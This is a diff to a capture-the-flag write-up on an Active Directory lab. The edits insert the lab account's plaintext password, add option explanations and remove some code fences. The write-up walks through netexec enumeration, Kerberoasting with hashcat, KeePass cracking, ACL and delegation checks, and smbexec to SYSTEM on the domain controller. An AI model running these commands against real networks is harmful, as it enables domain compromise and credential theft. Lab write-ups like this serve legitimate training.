@@ -44,7 +44,7 @@ The room started as an **assumed-breach** Active Directory scenario with valid c
 ```bash
 Domain   : ctf.local
 Username : j.smith
-Password : <REDACTED>
+Password : JSmith@IT2024
 Target   : DC01.ctf.local
 ```
 
@@ -89,7 +89,7 @@ The supplied credentials were first validated over SMB:
 ```bash
 netexec smb <TARGET_IP> \
   -u j.smith \
-  -p '<REDACTED>' \
+  -p JSmith@IT2024 \
   -d ctf.local
 ```
 
@@ -99,7 +99,6 @@ Authentication succeeded:
 [+] ctf.local\j.smith:<REDACTED>
 ```
 
-The account was therefore valid and could be used for authenticated domain enumeration.
 
 ---
 
@@ -110,7 +109,7 @@ Available shares were enumerated:
 ```bash
 netexec smb <TARGET_IP> \
   -u j.smith \
-  -p '<REDACTED>' \
+  -p JSmith@IT2024 \
   -d ctf.local \
   --shares
 ```
@@ -150,7 +149,7 @@ LDAP enumeration through NetExec revealed domain users:
 ```bash
 netexec ldap <TARGET_IP> \
   -u j.smith \
-  -p '<REDACTED>' \
+  -p JSmith@IT2024 \
   -d ctf.local \
   --users
 ```
@@ -185,9 +184,15 @@ The `svc.helpdesk` account was particularly interesting because service accounts
 SPNs were enumerated with Impacket:
 
 ```bash
+
 GetUserSPNs.py \
   -dc-ip <TARGET_IP> \
-  'ctf.local/j.smith:<REDACTED>'
+  'ctf.local/j.smith:JSmith@IT2024'
+
+Options:
+GetUserSPNs.py                    Impacket tool used to enumerate AD accounts with Service Principal Names
+-dc-ip <TARGET_IP>               specify the Domain Controller / KDC IP address
+ctf.local/j.smith:<PASSWORD>     authenticate to the domain using j.smith credentials
 ```
 
 Relevant result:
@@ -221,9 +226,7 @@ $krb5tgs$23$*svc.helpdesk$CTF.LOCAL$...
 The ticket was attacked with Hashcat using mode `13100`:
 
 ```bash
-hashcat -m 13100 \
-  helpdesk.hash \
-  /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 helpdesk.hash /usr/share/wordlists/rockyou.txt
 ```
 
 Result:
@@ -269,9 +272,7 @@ The Windows identity was verified:
 
 ```powershell
 whoami
-```
 
-```bash
 ctf\j.smith
 ```
 
@@ -279,11 +280,10 @@ Group membership was also inspected:
 
 ```powershell
 whoami /groups
-```
+
 
 Relevant memberships included:
 
-```bash
 BUILTIN\Remote Desktop Users
 CTF\AppLocker-Restricted
 ```
@@ -321,9 +321,7 @@ Database:$keepass$*4*600000*...
 John was then tested with `rockyou.txt`:
 
 ```bash
-john \
-  --wordlist=/usr/share/wordlists/rockyou.txt \
-  keepass.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
 ```
 
 The database used:
@@ -472,6 +470,14 @@ dacledit.py \
   -target 'DC01$' \
   -dc-ip <TARGET_IP> \
   'ctf.local/r.williams:<REDACTED>'
+
+Options:
+dacledit.py                         Impacket tool used to inspect or modify Active Directory ACLs
+-action read                        read the permissions instead of modifying them
+-principal r.williams              inspect permissions granted to r.williams
+-target 'DC01$'                    target the Domain Controller computer object
+-dc-ip <TARGET_IP>                 specify the Domain Controller IP address
+ctf.local/r.williams:<PASSWORD>    authenticate using r.williams domain credentials
 ```
 
 The important ACE was:
@@ -585,6 +591,13 @@ rbcd.py \
   -action read \
   -dc-ip <TARGET_IP> \
   'ctf.local/r.williams:<REDACTED>'
+
+Options:
+rbcd.py                            Impacket tool used to inspect or modify Resource-Based Constrained Delegation
+-delegate-to 'DC01$'               target the DC01 computer object
+-action read                       read the current RBCD configuration
+-dc-ip <TARGET_IP>                 specify the Domain Controller IP address
+ctf.local/r.williams:<PASSWORD>    authenticate using r.williams domain credentials
 ```
 
 Result:
@@ -715,11 +728,8 @@ smbexec.py \
   -k \
   -no-pass \
   ctf.local/Administrator@DC01.ctf.local
-```
 
-Here:
-
-```bash
+Options:
 -k        use Kerberos authentication
 -no-pass  use the loaded ticket instead of requesting a password
 ```
@@ -734,9 +744,7 @@ Remote execution succeeded and the resulting context was verified:
 
 ```cmd
 whoami
-```
 
-```bash
 nt authority\system
 ```
 
@@ -744,9 +752,7 @@ The final Administrator flag was then accessible:
 
 ```cmd
 type C:\Users\Administrator\Desktop\flag.txt
-```
 
-```bash
 THM{REDACTED}
 ```
 
